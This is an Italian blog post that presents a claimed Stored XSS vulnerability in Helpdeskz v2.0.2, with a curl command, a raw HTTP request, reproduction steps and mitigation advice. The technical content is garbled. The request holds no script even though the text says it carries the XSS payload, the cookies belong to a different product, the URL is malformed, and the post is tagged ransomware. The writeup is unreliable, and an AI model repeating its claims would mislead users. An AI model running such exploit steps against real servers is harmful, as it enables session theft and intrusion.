---
layout: post
title: '[webapps] Helpdeskz v2.0.2 - Stored XSS' 
date: 2024-08-23
categories: [security, ransomware]
---

# Titolo dell'articolo

[webapps] Helpdeskz v2.0.2 - Stored XSS Vulnerabilità

## Introduzione

In questo articolo, discuteremo di una vulnerabilità di sicurezza identificata nel software Helpdeskz v2.0.2, specificamente, una vulnerabilità di Stored XSS (Cross-Site Scripting). Questa vulnerabilità può permettere ad un attaccante di inserire script maligni che sono eseguiti nel browser dell'utente.

## Dettagli della vulnerabilità 

La vulnerabilità Stored XSS in questione riguarda il software Helpdeskz v2.0.2. Questa vulnerabilità permette a un attaccante di iniettare codice JavaScript malevolo che può essere eseguito nel browser dell'utente quando si visita una pagina web compromessa. Questo può portare a una serie di conseguenze pericolose, inclusa la possibilità di rubare informazioni sensibili.

## Esempio di Payload Semplice

L'esempio di payload semplice fornito è il seguente: 

```bash
curl -i -s -k -X 'POST' \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Referer: http://localhost/staff/index.php?/Tickets/Submit/Confirmation/1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost' \
    -b 'HESK_myemail=e%40mail.com; PHPSESSID=6dcd9fabe8d1f52e4933a815db1624a7; HESK_CSRF=1600297601' \
    --data-binary $'trackingID=210808-000001&x=78&y=16' \
    'http://localhost/staff/index.php?/Tickets/'%20-http://localhost/staff/index.php?/Tickets/Submit/Confirmation/1
```

## Esempio di Payload Avanzato

Non è disponibile un esempio di payload avanzato per questa vulnerabilità.

## Spiegazione Tecnica dello Script o Comando

Il comando `curl` sopra menzionato sta effettuando una richiesta POST a un server web ospitante Helpdeskz v2.0.2. Il comando invia specifici headers HTTP e un corpo di richiesta (`--data-binary`) che contiene il payload dell'XSS. 

## Procedura per riprodurre la vulnerabilità 

Per riprodurre la vulnerabilità, è sufficiente eseguire il comando curl fornito nel terminale, assicurandosi di sostituire `localhost` con l'indirizzo IP o il nome del server web target.

## Richiesta HTTP 

La richiesta HTTP inviata con il comando curl è così formattata:

```http
POST /staff/index.php?/Tickets/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost/staff/index.php?/Tickets/Submit/Confirmation/1
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost
Cookie: HESK_myemail=e%40mail.com; PHPSESSID=6dcd9fabe8d1f52e4933a815db1624a7; HESK_CSRF=1600297601
Content-Length: 30
trackingID=210808-000001&x=78&y=16
```

## Impatto della vulnerabilità 

L'impatto di questa vulnerabilità è significativo. Un attaccante può utilizzarlo per eseguire script maliziosi nel browser dell'utente, rubare dati sensibili, come le credenziali di login, o persino prendere il controllo della sessione dell'utente.

## Patch e Mitigazioni

Al momento della pubblicazione della vulnerabilità, non è stato rilasciato alcun aggiornamento di sicurezza ufficiale. Gli utenti dovrebbero considerare l'implementazione di controlli di sicurezza aggiuntivi, come l'escapement dell'output e l'implementazione di Content Security Policy (CSP), per mitigare il rischio.

## Conclusione 

La vulnerabilità Stored XSS nel software Helpdeskz v2.0.2 è un problema grave che può portare al furto di dati sensibili. È importante per gli amministratori di sistema essere consapevoli di questa vulnerabilità e prendere misure per mitigarne l'impatto.

## Considerazioni 

Mentre la Stored XSS è una vulnerabilità ben conosciuta, il suo impatto può variare notevolmente a seconda del contesto. In questo caso, l'attaccante ha la possibilità di rubare le credenziali di login degli utenti o prendere il controllo delle loro sessioni. Questo è un esempio del fatto che le vulnerabilità di vecchia data come XSS possono ancora essere molto pericolose se non adeguatamente mitigated.

